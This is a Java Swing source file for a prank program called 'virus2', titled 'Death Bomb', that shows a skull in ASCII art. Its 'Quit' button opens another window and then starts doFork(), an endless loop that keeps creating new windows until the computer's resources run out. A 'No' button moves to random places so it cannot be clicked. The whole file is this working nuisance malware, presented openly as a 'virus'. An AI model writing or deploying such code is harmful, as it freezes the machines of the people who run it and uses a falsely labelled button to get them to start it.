package vafspy.weparr;

import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Random;

//import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.text.StyledDocument;




public class virus2
{
	public JFrame frame;

	public JLabel bin;
	public JLabel title;
	public JButton negative ;
	public JButton yes ;
	public JLabel bin2;
	public JTextPane data;
	public JTextField input;
	public JTextField input2;
	public StyledDocument document;
	public JComboBox<String> choices;
	
	public static void main(String[] args){
		new virus2();
	}
	
public virus2() {
	frame = new JFrame();
	frame.setTitle("Death Bomb");
	frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
	frame.getContentPane().setLayout(null);
	
	//frame.setSize(5, 5);
	data = new JTextPane();
	data.setEditable(false);
	data.setOpaque(true);
	data.setFont(new Font("Courier New", Font.BOLD, 12));
	
	title = new JLabel();
	title.setText("Are You An Idiot?");
	title.setFont(new Font("Courier New", Font.BOLD, 20));
	title.setForeground(new Color(255,255,255));
	title.setBounds(70,10, 700, 100);
	
	//ImageIcon Logo = new ImageIcon("src/icon.png");
	//ImageIcon x = new ImageIcon("src/quit.png");
	
	yes = new JButton();
	yes.setText("Quit");
	yes.setBounds(500, 310, 90, 30);
	yes.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e)
		{
			new virus2();
			frame.setLocationRelativeTo(null);
			doFork();
		}});
	frame.add(yes);
//	 frame.add(yes);
	
	
	negative = new JButton();
	negative.setText("No");
	negative.setEnabled(true);
	negative.setBounds(170,300,200,40); // x ,y , hight, length
	negative.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {	
			noNo();}
	});
	
	JTextPane viruslogo = new JTextPane();
	viruslogo.setText("…………………▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n……………▄▄█▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓█▄▄\n…………▄▀▀▓▒░░░░░░░░░░░░░░░░▒▓▓▀▄\n………▄▀▓▒▒░░░░░░░░░░░░░░░░░░░▒▒▓▀▄\n……..█▓█▒░░░░░░░░░░░░░░░░░░░░░▒▓▒▓█\n…..▌▓▀▒░░░░░░░░░░░░░░░░░░░░░░░░▒▀▓█\n…..█▌▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█\n…▐█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█▌\n…█▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█\n..█▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓█\n…█▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█\n..█▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█\n..█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█\n.█▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒▒▄▄▄▓▓▓▓▒▒▐▓█\n.██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██\n..██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██\n..█▓▒▒▓██████████▓▒░░░▒▓██████████▓▒▒▓█\n..█▓▒░▒▓███████▓▓▄▀░░▀▄▓▓███████▓▒░▒▓█\n….█▓▒░▒▒▓▓▓▓▄▄▄▀▒░░░░░▒▀▄▄▄▓▓▓▓▒▒░▓█\n……█▓▒░▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒░▒▓█\n………█▓▓▒▒▒░░██░░▒▓██▓▒░░██░░▒▒▒▓▓█\n………▀██▓▓▓▒░░▀░▒▓████▓▒░▀░░▒▓▓▓██▀\n………….░▀█▓▒▒░░░▓█▓▒▒▓█▓▒░░▒▒▓█▀░\n…………█░░██▓▓▒░░▒▒▒░▒▒▒░░▒▓▓██░░█\n………….█▄░░▀█▓▒░░░░░░░░░░▒▓█▀░░▄█\n…………..█▓█░░█▓▒▒▒░░░░░▒▒▒▓█░░█▓█\n…………….█▓█░░█▀█▓▓▓▓▓▓█▀░░█░█▓█▌\n……………..█▓▓█░█░█░█▀▀▀█░█░▄▀░█▓█\n……………..█▓▓█░░▀█▀█░█░█▄█▀░░█▓▓█\n………………█▓▒▓█░░░░▀▀▀▀░░░░░█▓▓█\n………………█▓▒▒▓█░░░░ ░░░░█▓▓█\n………………..█▓▒▓██▄█░░░▄░▄██▓▒▓█\n………………..█▓▒▒▓█▒█▀█▄█▀█▒█▓▒▓█\n………………..█▓▓▒▒▓██▒▒██▒██▓▒▒▓█\n………………….█▓▓▒▒▓▀▀███▀▀▒▒▓▓█\n……………………▀█▓▓▓▓▒▒▒▒▓▓▓▓█▀\n………………………..▀▀██▓▓▓▓██▀ —");

	viruslogo.setFont(new Font("Courier New", Font.BOLD, 10));
	viruslogo.setForeground(new Color(204,204,204));
	viruslogo.setEditable(false);
	viruslogo.setOpaque(false);
	viruslogo.setBounds(130, 50, 530, 520);
	
	frame.add(viruslogo);
	
	
	//	frame.add(title);
	//	frame.add(negative);
	frame.add(data);
	frame.setSize(600, 600);
	frame.setLocationRelativeTo(null);
	frame.setResizable(false);
	
	frame.getContentPane().setBackground(new Color(50,50,50));
	frame.setVisible(true);
	
	}
	
public void noNo(){
	
	Random rand = new Random();

	
	int  x1 = rand.nextInt(660) +1;
	int  y1 = rand.nextInt(349) +1;
	System.out.println(x1 + " : " + y1);
	
			//Double x = new Double(negative.getAlignmentX());
			//Double y = new Double(negative.getAlignmentY());
			//int x2 = x.intValue();
			//int y2 = y.intValue();
			
			negative.setBounds(x1/2, y1 / 2, 200, 40);
	}

public void still(){
	
	
	frame.setLocationRelativeTo(null);
	
	//___________________________
	

	
}

public void doFork(){
	while (true){
		new virus2();
	}
}

}
